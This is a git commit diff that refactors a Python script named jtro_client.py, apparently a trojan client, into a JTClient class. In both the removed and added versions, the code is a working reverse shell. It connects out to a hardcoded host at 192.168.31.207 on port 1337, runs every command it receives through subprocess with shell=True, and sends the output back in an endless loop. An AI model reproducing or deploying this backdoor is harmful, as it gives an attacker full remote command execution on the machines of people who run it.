c41f30044f5c8ed726f230c7a04c06430e314474
jakiiii <me.jaki@outlook.com>
2019-02-13 15:27:47 +0600

    create jTro client class

--- jtro_client.py
+++ jtro_client.py
@@ -3,16 +3,22 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class JTClient:
+    def __init__(self, ip, port):
+        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.c.connect((ip, port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            cmd = self.c.recv(1024).decode('utf-8')
+            cmd_result = self.execute_system_command(cmd)
+            self.c.send(cmd_result)
+
+        self.c.close()
 
 
-c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-c.connect(("192.168.31.207", 1337))
-
-while True:
-    cmd = c.recv(1024).decode('utf-8')
-    cmd_result = execute_system_command(cmd)
-    c.send(cmd_result)
-
-c.close()
+jTro_client = JTClient("192.168.31.207", 1337)
+jTro_client.run()
